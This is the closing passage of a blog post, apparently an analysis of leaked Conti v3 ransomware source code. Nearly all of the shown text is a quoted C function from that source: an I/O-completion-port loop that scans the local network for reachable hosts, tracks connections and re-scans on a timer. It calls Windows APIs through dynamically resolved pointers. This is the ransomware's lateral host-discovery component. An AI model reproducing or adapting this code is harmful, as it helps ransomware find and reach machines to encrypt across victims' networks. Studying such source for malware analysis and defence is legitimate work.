pExitThread(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line"></span><br><span class="line">		DWORD dwBytesTransferred;</span><br><span class="line">		ULONG_PTR CompletionStatus;</span><br><span class="line">		PCONNECT_CONTEXT ConnectContext;</span><br><span class="line"></span><br><span class="line">		BOOL Success = (BOOL)pGetQueuedCompletionStatus(g_IocpHandle, &amp;dwBytesTransferred, &amp;CompletionStatus, (LPOVERLAPPED*)&amp;ConnectContext, INFINITE);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (CompletionStatus == START_COMPLETION_KEY) &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			ScanHosts();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">				pExitThread(EXIT_FAILURE);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (CompletionStatus == CONNECT_COMPLETION_KEY) &#123;</span><br><span class="line"></span><br><span class="line">			g_ActiveOperations--;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (Success &amp;&amp; CompleteAsyncConnect(ConnectContext-&gt;s)) &#123;</span><br><span class="line"></span><br><span class="line">				ConnectContext-&gt;State = CONNECTED;</span><br><span class="line">				AddHost(ConnectContext-&gt;dwAddres);</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">				ConnectContext-&gt;State = NOT_CONNECTED;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!g_ActiveOperations &amp;&amp; IsTimerActivated) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (CompletionStatus == TIMER_COMPLETION_KEY) &#123;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = TRUE;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (g_ActiveOperations) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = <span class="literal">NULL</span>;</span><br><span class="line">				TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (ConnectCtx-&gt;State == CONNECTING) &#123;</span><br><span class="line">						pCancelIo((HANDLE)ConnectCtx-&gt;s);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pDeleteTimerQueue(hTimerQueue);</span><br><span class="line">	pExitThread(EXIT_SUCCESS);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Reference:</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/_fs/">MSDN</a></p>
<p><a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/g-fact-70/">Critical Section in Synchronization</a></p>
</p><div class="tip">本文采用CC-BY-SA-3.0协议，转载请注明出处<br>Author: scr1pt</div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-18</span><i class="fa fa-tag"></i><a class="tag" href="/tags/Ransomeware-Conti-v3/" title="Ransomeware,Conti v3">Ransomeware,Conti v3 </a><span class="leancloud_visitors"></span><span>About 3582 words, 11 min 56 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,https://Scr1pt-kid.github.io/2022/04/18/conti v3 source code learning/,scr1pt's blog,Conti v3 Ransomeware Souce Code Analysis,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2022/04/18/anti-hook/" title="anti-hook">Previous</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2022/04/13/Pandora-Ransomeware-fla-unpack/" title="Pandora-Ransomeware-fla-unpack">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>